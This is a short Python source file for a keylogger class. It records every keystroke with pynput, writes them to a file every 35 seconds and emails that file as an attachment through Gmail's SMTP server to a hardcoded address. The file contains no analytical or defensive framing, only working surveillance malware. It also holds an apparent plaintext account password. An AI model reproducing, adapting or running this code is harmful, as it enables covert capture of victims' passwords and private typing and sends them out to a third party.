import pynput.keyboard, threading
import smtplib,time
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

log = ""


class keylog:

    def mail(self):
        c=True
        while c:
            try:
                fromaddr = "cyberbot1502@gmail.com"
                toaddr = "cyberbot1502@gmail.com"
                msg = MIMEMultipart()
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg['Subject'] = "Log file"
                body = "Log"
                msg.attach(MIMEText(body, 'plain'))
                filename = "logg.txt"
                attachment = open(r"/root/Desktop/logg", "rb")
                p = MIMEBase('application', 'octet-stream')
                p.set_payload((attachment).read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', "attachment; filename=%s" % filename)
                msg.attach(p)
                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.starttls()
                s.login(fromaddr, "Hexadecimalqwertyuiop")
                text = msg.as_string()
                s.sendmail(fromaddr, toaddr, text)
                print("Mail Sent!")
                c=False
            except Exception as e:
                time.sleep(5)
                c=True
                print(e)

    def pkp(self, key):
        global log
        try:
            log = log + str(key.char)
        except  Exception as e:
            if key == key.space:
                log = log + " "
            else:
                log = log + " " + str(key) + " "

    def report(self):

        global log
        f = open(r'/root/Desktop/logg', 'a+')
        f.write("\n")
        f.write(log)
        self.mail()
        log = ""
        timer = threading.Timer(35, self.report)
        timer.start()

    def start(self):
        kl = pynput.keyboard.Listener(on_press=self.pkp)
        with kl:
            self.report()
            kl.join()
